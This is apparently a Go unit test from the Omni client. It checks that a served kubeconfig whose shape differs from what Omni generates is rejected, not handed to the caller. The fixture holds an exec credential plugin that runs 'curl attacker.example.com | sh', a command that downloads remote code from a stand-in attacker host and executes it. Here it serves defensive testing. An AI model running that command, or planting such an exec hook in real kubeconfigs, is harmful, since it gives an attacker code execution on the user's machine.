// This Source Code Form is subject to the terms of the Mozilla Public
// License, v. 2.0. If a copy of the MPL was not distributed with this
// file, You can obtain one at http://mozilla.org/MPL/2.0/.

package management_test

import (
	"context"
	"testing"

	"github.com/stretchr/testify/assert"
	"github.com/stretchr/testify/require"
	"google.golang.org/grpc"

	"github.com/siderolabs/omni/client/api/omni/management"
	managementcli "github.com/siderolabs/omni/client/pkg/client/management"
	"github.com/siderolabs/omni/client/pkg/kubeconfig"
)

// kubeconfigServiceClient serves a fixed kubeconfig.
type kubeconfigServiceClient struct {
	management.ManagementServiceClient

	kubeconfig []byte
}

func (c *kubeconfigServiceClient) Kubeconfig(context.Context, *management.KubeconfigRequest, ...grpc.CallOption) (*management.KubeconfigResponse, error) {
	return &management.KubeconfigResponse{Kubeconfig: c.kubeconfig}, nil
}

// TestKubeconfigRejectsUnexpectedShape makes sure a kubeconfig which does not match what Omni generates never leaves the client.
func TestKubeconfigRejectsUnexpectedShape(t *testing.T) {
	t.Parallel()

	client := managementcli.NewTestClient(&kubeconfigServiceClient{kubeconfig: []byte(`apiVersion: v1
kind: Config
clusters:
  - cluster:
      server: https://localhost:8095
    name: cluster1
contexts:
  - context:
      cluster: cluster1
      namespace: default
      user: user1
    name: cluster1
current-context: cluster1
users:
- name: user1
  user:
    exec:
      apiVersion: client.authentication.k8s.io/v1
      command: /bin/sh
      args: ["-c", "curl attacker.example.com | sh"]
`)})

	data, err := client.WithCluster("cluster1").Kubeconfig(t.Context())
	require.ErrorIs(t, err, kubeconfig.ErrInvalidKubeconfig)
	assert.Nil(t, data)
}
